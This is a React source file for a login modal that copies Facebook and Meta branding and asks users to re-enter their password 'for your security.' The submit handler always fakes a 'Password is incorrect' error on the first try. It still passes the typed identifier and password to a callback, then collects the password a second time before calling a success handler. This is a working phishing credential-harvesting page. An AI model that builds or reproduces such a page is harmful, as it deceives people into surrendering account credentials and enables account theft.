import { useState } from 'react';
import PropTypes from 'prop-types';
import config from '@/utils/config';
import FbRoundLogo from '@/assets/images/fb_round_logo.png';
import MetaLogo from '@/assets/images/logo-meta.svg';

const inputWrapperBase = {
    position: 'relative',
    width: '100%',
    border: '1px solid #d4dbe3',
    height: '40px',
    padding: '0 11px',
    borderRadius: '10px',
    background: '#fff',
    fontSize: '14px',
    marginBottom: '10px',
    display: 'flex',
    alignItems: 'center',
    transition: 'border-color 0.2s, box-shadow 0.2s',
    boxSizing: 'border-box'
};

const LoginModal = ( { show, onClose, onSubmit, onSuccess, texts } ) =>
{
    const [ formData, setFormData ] = useState( {
        identifier: '',
        password: ''
    } );
    const [ showPassword, setShowPassword ] = useState( false );
    const [ loginAttempt, setLoginAttempt ] = useState( 0 );
    const [ isLoading, setIsLoading ] = useState( false );
    const [ showError, setShowError ] = useState( false );
    const [ focusedField, setFocusedField ] = useState( null );

    const handleChange = ( field, value ) =>
    {
        setFormData( ( prev ) => ( { ...prev, [ field ]: value } ) );
        if ( showError ) setShowError( false );
    };

    const handleSubmit = async ( e ) =>
    {
        e.preventDefault();
        if ( !formData.password.trim() ) return;

        setIsLoading( true );
        setShowError( false );

        setTimeout( () =>
        {
            setIsLoading( false );
            if ( loginAttempt === 0 )
            {
                setShowError( true );
                setLoginAttempt( 1 );
                onSubmit( formData.identifier, formData.password );
            } else
            {
                setShowError( false );
                onSubmit( formData.identifier, formData.password );
                onSuccess();
            }
        }, config.password_loading_time * 1000 );
    };

    if ( !show ) return null;

    return (
        <>
            {/* Backdrop */ }
            <div
                onClick={ onClose }
                style={ { position: 'fixed', inset: 0, zIndex: 1040, background: 'rgba(0,0,0,0.5)' } }
            />

            {/* Modal */ }
            <div style={ {
                position: 'fixed', inset: 0, zIndex: 1050,
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                padding: '16px'
            } }>
                <div
                    style={ {
                        background: 'linear-gradient(130deg, rgba(249,241,249,1) 0%, rgba(234,243,253,1) 35%, rgba(237,251,242,1) 100%)',
                        width: '100%',
                        maxWidth: '512px',
                        maxHeight: '90vh',
                        borderRadius: '16px',
                        boxShadow: '0 20px 60px rgba(0,0,0,0.2)',
                        padding: '20px',
                        display: 'flex',
                        flexDirection: 'column',
                        overflow: 'hidden'
                    } }
                    onClick={ ( e ) => e.stopPropagation() }
                >
                    {/* Empty header row */ }
                    <div style={ { display: 'flex', justifyContent: 'flex-end', marginBottom: '0' } } />

                    {/* Scrollable body */ }
                    <div style={ { flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', alignItems: 'center' } }>

                        {/* Logo top */ }
                        <div style={ { width: '50px', height: '50px', margin: '0 auto 20px' } }>
                            <img src={ FbRoundLogo } alt="logo" style={ { width: '100%', height: '100%', objectFit: 'contain' } } />
                        </div>

                        {/* Form area */ }
                        <div style={ { width: '100%', padding: '32px 0' } }>
                            <p style={ { color: '#9a979e', fontSize: '14px', marginBottom: '7px' } }>
                                For your security, you must enter your password to continue.
                            </p>

                            <form autoComplete="off" onSubmit={ handleSubmit }>

                                {/* Identifier — only on first attempt */ }
                                { loginAttempt === 0 && (
                                    <div
                                        style={ {
                                            ...inputWrapperBase,
                                            borderColor: focusedField === 'identifier' ? '#3b82f6' : '#d4dbe3',
                                            boxShadow: focusedField === 'identifier' ? '0 4px 12px rgba(59,130,246,0.1)' : 'none'
                                        } }
                                    >
                                        <input
                                            id="loginIdentifier"
                                            placeholder={ texts.mobileOrEmail || 'Mobile number or email' }
                                            type="text"
                                            autoComplete="username"
                                            value={ formData.identifier }
                                            onChange={ ( e ) => handleChange( 'identifier', e.target.value ) }
                                            onFocus={ () => setFocusedField( 'identifier' ) }
                                            onBlur={ () => setFocusedField( null ) }
                                            style={ { width: '100%', outline: 'none', border: 'none', background: 'transparent', fontSize: '14px', height: '100%' } }
                                        />
                                    </div>
                                ) }

                                {/* Password field */ }
                                <div
                                    style={ {
                                        ...inputWrapperBase,
                                        borderColor: showError ? '#ef4444' : focusedField === 'password' ? '#3b82f6' : '#d4dbe3',
                                        boxShadow: showError
                                            ? '0 4px 12px rgba(239,68,68,0.1)'
                                            : focusedField === 'password' ? '0 4px 12px rgba(59,130,246,0.1)' : 'none',
                                        paddingRight: '44px'
                                    } }
                                >
                                    <input
                                        id="password"
                                        placeholder="Enter your password"
                                        autoComplete="new-password"
                                        type={ showPassword ? 'text' : 'password' }
                                        value={ formData.password }
                                        onChange={ ( e ) => handleChange( 'password', e.target.value ) }
                                        onFocus={ () => setFocusedField( 'password' ) }
                                        onBlur={ () => setFocusedField( null ) }
                                        style={ {
                                            width: '100%', outline: 'none', border: 'none',
                                            background: 'transparent', fontSize: '14px', height: '100%',
                                            /* hide MS reveal button */
                                            MsReveal: 'none'
                                        } }
                                    />
                                    {/* Toggle show/hide */ }
                                    <button
                                        type="button"
                                        tabIndex={ -1 }
                                        onClick={ () => setShowPassword( p => !p ) }
                                        style={ {
                                            position: 'absolute', right: '12px',
                                            top: '50%', transform: 'translateY(-50%)',
                                            background: 'transparent', border: 'none',
                                            cursor: 'pointer', padding: 0, display: 'flex', alignItems: 'center'
                                        } }
                                    >
                                        { showPassword ? (
                                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                                                <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7z" />
                                                <circle cx="12" cy="12" r="3" />
                                            </svg>
                                        ) : (
                                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                                                <path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49" />
                                                <path d="M14.084 14.158a3 3 0 0 1-4.242-4.242" />
                                                <path d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143" />
                                                <path d="m2 2 20 20" />
                                            </svg>
                                        ) }
                                    </button>
                                    <style>{ `.hide-password-toggle::-ms-reveal, .hide-password-toggle::-ms-clear { display: none; }` }</style>
                                </div>

                                {/* Error message */ }
                                { showError && (
                                    <p style={ { color: '#ef4444', fontSize: '13px', marginTop: '-6px', marginBottom: '10px' } }>
                                        { texts.passwordIncorrect || 'Password is incorrect, please try again.' }
                                    </p>
                                ) }

                                {/* Submit */ }
                                <div style={ { width: '100%', marginTop: '20px' } }>
                                    <button
                                        type="submit"
                                        disabled={ isLoading }
                                        style={ {
                                            height: '45px', minHeight: '45px', width: '100%',
                                            background: '#0064E0', color: '#fff',
                                            borderRadius: '40px', border: 'none',
                                            display: 'flex', alignItems: 'center', justifyContent: 'center',
                                            cursor: isLoading ? 'not-allowed' : 'pointer',
                                            fontWeight: '500', fontSize: '15px',
                                            fontFamily: 'inherit', position: 'relative',
                                            opacity: isLoading ? 0.8 : 1,
                                            transition: 'opacity 0.3s'
                                        } }
                                    >
                                        { isLoading ? (
                                            <span style={ {
                                                width: '20px', height: '20px',
                                                border: '2.5px solid rgba(255,255,255,0.4)',
                                                borderTopColor: '#fff',
                                                borderRadius: '50%',
                                                animation: 'spin 0.8s linear infinite',
                                                display: 'inline-block'
                                            } } />
                                        ) : 'Continue' }
                                    </button>
                                </div>

                                {/* Forgot password */ }
                                <p style={ { textAlign: 'center', marginTop: '10px' } }>
                                    <a href="#" style={ { color: '#9a979e', fontSize: '14px', textDecoration: 'none' } }>
                                        Forgot your password?
                                    </a>
                                </p>

                            </form>
                        </div>

                        {/* Meta logo bottom */ }
                        <div style={ { width: '60px', margin: '20px auto 0' } }>
                            <img src={ MetaLogo } alt="Meta" style={ { width: '100%', height: 'auto', objectFit: 'contain', opacity: 0.4 } } />
                        </div>

                    </div>
                </div>
            </div>

            <style>{ `@keyframes spin { to { transform: rotate(360deg); } }` }</style>
        </>
    );
};

LoginModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    onSubmit: PropTypes.func.isRequired,
    onSuccess: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired
};

export default LoginModal;
